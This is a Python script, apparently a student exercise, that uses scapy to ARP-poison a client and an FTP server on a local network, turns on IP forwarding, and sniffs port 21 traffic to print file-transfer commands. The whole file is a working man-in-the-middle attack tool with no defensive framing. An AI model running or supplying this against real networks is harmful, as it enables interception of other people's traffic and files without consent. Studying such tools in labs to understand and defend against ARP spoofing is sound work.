#!/usr/bin/env python3
import os
import sys
import ipaddress
import re
import time
from scapy.all import ARP, send, sniff, TCP, Raw, Ether

class Inquisitor():
    def __init__(self, argument):
        self.ip_addr_host = argument[1]
        self.mac_addr_host = argument[2]
        self.ip_addr_serv = argument[3]
        self.mac_addr_serv = argument[4]
        print(f"Constructor, inquisition set : {self.mac_addr_host} + {self.ip_addr_host} + {self.mac_addr_serv} + {self.ip_addr_serv}")

    def send_poison(self):
        # Lying to the client #
        poison_client = Ether(dst=self.mac_addr_host) / ARP(op=2, pdst=self.ip_addr_host, hwdst=self.mac_addr_host, psrc=self.ip_addr_serv)
        # Lying to the server #
        poison_serv = Ether(dst=self.mac_addr_serv) / ARP(op=2, pdst=self.ip_addr_serv, hwdst=self.mac_addr_serv, psrc=self.ip_addr_host)
        # Sending through the Network #
        send(poison_client, verbose=False)
        send(poison_serv, verbose=False)

    def packet_callback(self, packet):
        if(packet.haslayer(Raw)):
            try:
                payload = packet[Raw].load.decode('utf-8', errors='ignore')
                if "RETR" in payload or "STOR" in payload:
                    print(f"[*] File founded : {payload.strip()}")
            except:
                pass

    def run(self):
        print("[*] Starting port forwording")
        os.system("echo 1 > /proc/sys/net/ipv4/ip_forward")
        try:
            print("[*] Initalise the poison loop")
            while True:
                self.send_poison()
                sniff(filter="tcp port 21", prn=self.packet_callback, store=0, timeout=2)
        except KeyboardInterrupt :
            print("[*] Poison loop has been manually stopped")
            os.system("echo 0 > /proc/sys/net/ipv4/ip_forward")

    def verify_addr(self):
        pattern = r'^([0-9A-Fa-f]{2}[:-]){5}([0-9A-Fa-f]{2})$'
        try:
            ipaddress.IPv4Address(self.ip_addr_host)
            ipaddress.IPv4Address(self.ip_addr_serv)
            print("Ipv4 are valid!")
            if not re.match(pattern, self.mac_addr_host) or not re.match(pattern, self.mac_addr_serv):
                print("ERROR")
                return
            print("MacAddress are valid!")
            
        except Exception as e:
            print(f"[ERROR], {e}")


    def poisoning(self):
        print("All the logic about the change of IP in the networks")
        self.verify_addr()

def main():
    if(len(sys.argv) < 5):
        print("[ERROR, not enought args]")
        return
    inquisition = Inquisitor(sys.argv)
    inquisition.verify_addr()
    inquisition.run()
    

if (__name__ == "__main__"):
    main()